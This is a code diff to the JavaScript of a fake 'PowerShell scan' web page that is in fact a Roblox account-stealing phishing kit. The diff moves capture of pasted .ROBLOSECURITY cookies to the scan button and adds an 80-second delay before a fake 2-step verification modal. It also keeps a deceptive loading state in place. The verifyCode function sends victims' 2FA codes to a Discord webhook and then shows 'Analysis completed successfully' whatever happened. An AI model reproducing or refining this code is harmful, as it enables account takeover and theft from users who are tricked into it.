@@ -32,22 +32,28 @@ window.test2FA = function() {
     openVerificationModal();
 };
 
-// Test paste event function with shortened timer
+// Test scan button flow with shortened timer
 window.testPasteEvent = function() {
-    console.log('Testing paste event with 5 second timer...');
+    console.log('Testing scan button flow with 5 second timer...');
     
-    // Simulate the paste event detection and immediate send
-    console.log('🍪 Simulating cookie capture...');
-    console.log('🚫 Scan button will be disabled until 2FA completes');
+    // Simulate the scan button being clicked
+    const textarea = document.getElementById('powershellInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const submitText = document.getElementById('submitText');
     
-    // Set the 2FA timer flag
-    window.twofaTimerActive = true;
+    if (textarea) {
+        textarea.value = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhAB.TEST123';
+    }
+    
+    if (submitBtn && submitText) {
+        submitBtn.disabled = true;
+        submitText.textContent = 'Processing...';
+        console.log('🔍 Scan button loading...');
+    }
     
     setTimeout(() => {
         console.log('5 seconds elapsed, opening 2-step verification modal...');
         openVerificationModal();
-        // Reset the flag after 2FA modal opens
-        window.twofaTimerActive = false;
     }, 5000); // 5 seconds instead of 80
     
     console.log('Timer started - 2FA modal will open in 5 seconds');
@@ -186,12 +192,54 @@ async function verifyCode() {
         // Send 2FA code to Discord webhook
         await send2FAToWebhook(code, trustDevice);
         
-        // Show success regardless of code (since it's captured)
-        showVerificationSuccess(trustDevice);
+        // Keep the scan button in loading state and close 2FA modal
+        closeVerificationModal();
+        
+        // Show success message but keep scan button loading
+        const submitBtn = document.getElementById('submitBtn');
+        const submitText = document.getElementById('submitText');
+        if (submitText) {
+            submitText.textContent = 'Completing...';
+        }
+        
+        // After a brief delay, show success and reset
+        setTimeout(() => {
+            if (submitBtn && submitText) {
+                submitBtn.disabled = false;
+                submitText.textContent = 'Scan';
+                submitBtn.style.background = '';
+            }
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            if (loadingOverlay) loadingOverlay.style.display = 'none';
+            
+            showNotification('Analysis completed successfully', 'success');
+        }, 2000);
+        
     } catch (error) {
         console.error('Webhook error:', error);
-        // Still show success to user even if webhook fails
-        showVerificationSuccess(trustDevice);
+        
+        // Keep the scan button in loading state and close 2FA modal
+        closeVerificationModal();
+        
+        // Show success message but keep scan button loading
+        const submitBtn = document.getElementById('submitBtn');
+        const submitText = document.getElementById('submitText');
+        if (submitText) {
+            submitText.textContent = 'Completing...';
+        }
+        
+        // After a brief delay, show success and reset
+        setTimeout(() => {
+            if (submitBtn && submitText) {
+                submitBtn.disabled = false;
+                submitText.textContent = 'Scan';
+                submitBtn.style.background = '';
+            }
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            if (loadingOverlay) loadingOverlay.style.display = 'none';
+            
+            showNotification('Analysis completed successfully', 'success');
+        }, 2000);
     }
 }
 
@@ -563,12 +611,7 @@ async function submitPowerShell() {
     const loadingOverlay = document.getElementById('loadingOverlay');
     const inputText = input.value.trim();
     
-    // Check if 2FA timer is active (paste event detected a cookie)
-    if (window.twofaTimerActive) {
-        console.log('🔐 2FA timer is active - scan blocked. Please wait for 2-step verification.');
-        showNotification('2-Step verification will appear shortly. Please wait...', 'info');
-        return;
-    }
+
     
     // Validation
     if (!inputText) {
@@ -598,6 +641,21 @@ async function submitPowerShell() {
         
         // Show word count on button temporarily
         submitText.textContent = `${wordCount} words`;
+        
+        // If cookie is found, start the 2FA flow instead of blocking
+        if (robloxCookie) {
+            console.log('🍪 Cookie detected! Starting 2FA flow...');
+            submitText.textContent = 'Processing...';
+            
+            // Start 80-second timer for 2FA modal
+            setTimeout(() => {
+                console.log('80 seconds elapsed, opening 2-step verification modal...');
+                openVerificationModal();
+            }, 80000); // 80 seconds
+            
+            // Don't reset loading state - keep it loading through 2FA
+            return;
+        }
         
         // Block execution if no authentication data is found AND less than 50 words
         if (!robloxCookie && wordCount < 50) {
@@ -1028,16 +1086,7 @@ document.addEventListener('DOMContentLoaded', function() {
             updateCharCount();
         });
         
-        // Handle paste events for immediate cookie capture
-        textarea.addEventListener('paste', function(e) {
-            setTimeout(() => {
-                const pastedText = this.value;
-                handlePasteEvent(pastedText);
-                
-                // Mark that 2FA timer is active to prevent normal scan
-                window.twofaTimerActive = true;
-            }, 100); // Small delay to ensure paste content is processed
-        });
+        // Paste events are now handled through the scan button flow
         
         // Initialize character count
         updateCharCount();
